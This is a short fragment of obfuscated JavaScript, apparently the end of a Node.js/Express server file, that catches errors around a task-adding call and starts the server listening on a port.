AddVisitTask();}catch(_0x1e42ff){console['error'](_0x13d201(0x226),_0x1e42ff);}}startserver()[_0x27f53b(0x1ae)](_0x45866b=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x45866b);}),app['listen'](PORT,()=>console['log'](_0x27f53b(0x1c9)+PORT+'!'));
